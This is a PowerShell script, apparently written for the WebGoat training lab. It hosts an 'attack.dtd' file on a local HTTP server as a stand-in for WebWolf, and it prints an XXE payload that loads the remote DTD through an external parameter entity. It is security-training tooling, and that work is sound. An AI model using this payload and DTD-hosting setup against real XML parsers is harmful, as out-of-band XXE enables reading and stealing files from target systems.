# Simple HTTP Server to Host DTD File
# Alternative to WebWolf if file upload fails

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "  DTD HTTP Server - Alternative to WebWolf" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

$dtdFile = "c:\webgoat-scripts-1\attack.dtd"
$port = 8003

# Check if attack.dtd exists
if (-not (Test-Path $dtdFile)) {
    Write-Host "ERROR: attack.dtd not found!" -ForegroundColor Red
    Write-Host "Location: $dtdFile" -ForegroundColor Yellow
    exit 1
}

Write-Host "✅ Found: attack.dtd" -ForegroundColor Green
Write-Host ""

# Display DTD content
Write-Host "DTD Content:" -ForegroundColor Yellow
Get-Content $dtdFile | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
Write-Host ""

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Starting HTTP Server..." -ForegroundColor Green
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Server URL: http://127.0.0.1:$port" -ForegroundColor Yellow
Write-Host "DTD URL: http://127.0.0.1:$port/attack.dtd" -ForegroundColor Yellow
Write-Host ""
Write-Host "Press Ctrl+C to stop the server" -ForegroundColor White
Write-Host ""

# Check if Python is available
$pythonCmd = Get-Command python -ErrorAction SilentlyContinue

if ($pythonCmd) {
    Write-Host "Using Python HTTP Server..." -ForegroundColor Green
    Write-Host ""
    
    # Change to directory and start server
    Set-Location "c:\webgoat-scripts-1"
    
    Write-Host "=====================================================================" -ForegroundColor Cyan
    Write-Host "Update your XXE payload to use:" -ForegroundColor Yellow
    Write-Host ""
    Write-Host '<!DOCTYPE root [' -ForegroundColor White
    Write-Host "  <!ENTITY % remote SYSTEM `"http://127.0.0.1:$port/attack.dtd`">" -ForegroundColor White
    Write-Host '  %remote;' -ForegroundColor White
    Write-Host ']>' -ForegroundColor White
    Write-Host ""
    Write-Host "=====================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Start Python HTTP server
    python -m http.server $port
    
} else {
    Write-Host "Python not found. Trying alternative method..." -ForegroundColor Yellow
    Write-Host ""
    
    # PowerShell HTTP Server (simple version)
    Write-Host "Starting PowerShell HTTP Listener..." -ForegroundColor Green
    Write-Host ""
    
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://127.0.0.1:$port/")
    $listener.Start()
    
    Write-Host "Server is running!" -ForegroundColor Green
    Write-Host "Listening on: http://127.0.0.1:$port/" -ForegroundColor Yellow
    Write-Host ""
    
    try {
        while ($listener.IsListening) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            $url = $request.Url.LocalPath
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($request.HttpMethod) $url" -ForegroundColor Cyan
            
            if ($url -eq "/attack.dtd") {
                # Serve DTD file
                $content = Get-Content $dtdFile -Raw
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
                
                $response.ContentType = "application/xml-dtd"
                $response.ContentLength64 = $buffer.Length
                $response.StatusCode = 200
                
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                $response.OutputStream.Close()
                
                Write-Host "  ✅ Served attack.dtd" -ForegroundColor Green
            } else {
                # 404 for other paths
                $notFound = "404 - Not Found"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($notFound)
                
                $response.StatusCode = 404
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                $response.OutputStream.Close()
                
                Write-Host "  ❌ 404 Not Found" -ForegroundColor Red
            }
        }
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        $listener.Stop()
        Write-Host ""
        Write-Host "Server stopped." -ForegroundColor Yellow
    }
}
